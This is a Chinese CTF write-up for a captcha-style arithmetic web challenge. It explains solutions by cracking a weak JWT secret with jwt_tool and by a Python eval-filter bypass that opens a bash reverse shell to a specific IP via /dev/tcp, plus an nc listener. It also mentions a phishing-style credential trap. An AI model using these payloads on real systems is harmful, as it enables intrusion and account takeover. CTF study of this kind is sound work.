# I am not a robot!

- 出题人: pyy

- 验题人: pyy

## 题目描述

为了证明自己的身份, 冲吧少年!

注: 这道题的flag格式可能为了好看(?)所以做了一些小小的改动, 不过不用担心, 你一眼就能认出来的

- tips: 可以思考一下`服务器是怎么实现这些功能的`? 如果让你写一个类似的程序 (不包括编写网站的知识, 就单纯把它看做是一个`给定输入输出格式的函数`, 要求实现这样的功能) 的话, 你会用什么方法实现?

- tips2: 本题的提示非常的良心, 一个提示, 四种思路, 36分你买不了吃亏, 买不了上当, 真正的物超所值! 赶紧快来抢购吧!

- tips3: 这题是用python写的, python是一门著名的`解释型语言`。

- tips4: 在这道题的世界里, 出题人毫无安全意识, 非常喜欢使用弱密码。

上轮提示:

- 服务器怎么知道你是谁?
- 服务器怎么知道你答出了几道题?
- 服务器怎么知道你正在答的是哪道题? 而它又怎么知道这题的答案?
- 服务器怎么判断答案的正确性?(譬如: 怎么处理除法的分数?)

- 注: 本题共有四种解题思路, 上面的问题想通一两点或许对解题也有很大的帮助

以及36分提示:

- cookie好像有很多种?
- 有没有可能, 它的过滤不是很全?
- ocr做不到的事情, 如果自己写一份字符匹配呢?(只有10个数字和符号的匹配)
- 其实500道的话......2个小时应该也可以算完?

## 出题思路

曾经有一道验证码题, 那个图是看一眼就很花, 然后就借鉴了一下验证码的思路出了这题。(但增加了各种奇怪的解法, 因为出题的时候正好想到了.jpg)

原本这道题是有`% | & ^`运算符的, 这样的话按照逻辑就会过滤掉这四个运算符, 至少shell弹不出来了, 现在还是能弹的。

与钓鱼题联动环节: 在答出0题时输入你的账密, 此时服务器会登录你的账户然后交-100的flag。

## 解法

### 预期解法1(jwt)

![image-20220506173829929](readme.assets/image-20220506173829929.png)

本题用这个样的jwt来记录做出的题以及当前的题目地址, 进jwt.io翻译一下:

![image-20220506174005465](readme.assets/image-20220506174005465.png)

当做出一道题之后n会变成1。

那么目前要做的就是改n了, 尝试着改改看:

![image-20220506174155928](readme.assets/image-20220506174155928.png)

然后被发现了。这个就是jwt第三部分的作用。

尝试伪造jwt需要破解它的密码, 既然是弱密码那就走一个爆破。

`.\jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po -C -d ..\..\docs\dicts\fuzzDicts\passwordDict\top19576.txt`

![image-20220506180255729](readme.assets/image-20220506180255729.png)

然后拿admin去造一个jwt就好了:

![image-20220506180336720](readme.assets/image-20220506180336720.png)

### 预期解法2

应当使用分数回答除法题, 那么背后最省力的做法就是放个eval(我偷了懒, 你们也获得了一种新的解法, 双赢~)

随便打一个import进去, 发现有提示过滤了什么:

![image-20220506180748743](readme.assets/image-20220506180748743.png)

我们偷看一眼源码, 发现过滤了['eval','exec','import','system','getattr','open','kill','+','*'], 但没过滤`__builtins__`和`__dict__`, 那就好办了。

payload: `__builtins__["__imp""ort__"]("os").__dict__['po''pen']('bash -c "bash -i >& /dev/tcp/45.11.2.122/27420 0>&1"')`(不知道为啥本地测试的时候builtins后面要加dict, fastapi里跑起来的时候又不用了(也是本地)?)

此时开个内网穿透, 用linux中的nc执行`nc -lvp 42648`, 完成反弹shell。

![image-20220506191649364](readme.assets/image-20220506191649364.png)

`cat app.py`获取源码

![image-20220506191738798](readme.assets/image-20220506191738798.png)

其实上面的命令也可以直接`cat app.py`(ls啥的过程省略), 然后报答案错的那个页面会有回显的(不过需要f12看包的记录)。

### 预期解法3

做一份图像匹配然后自动交题, 主要是用正则获取图片链接下载, 然后本地计算后上交。

(仅一种思路, 之前做过但那次做的很麻烦且有很多bug, 所以摸鱼摸鱼)

### 预期解法4

500道题, 很快的啦~(
